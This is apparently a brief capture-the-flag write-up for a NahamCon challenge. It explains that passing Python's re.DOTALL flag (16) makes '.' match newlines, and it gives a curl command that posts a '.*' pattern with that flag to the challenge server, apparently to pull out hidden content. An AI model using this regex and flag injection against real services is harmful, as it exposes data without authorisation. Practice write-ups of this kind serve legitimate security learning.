Use `re.DOTALL`, which is `16` in enum to make the `.` special character match any character at all, including a newline.

```bash
curl http://challenge.nahamcon.com:30349 -d 'name=.*&setting=16'
```
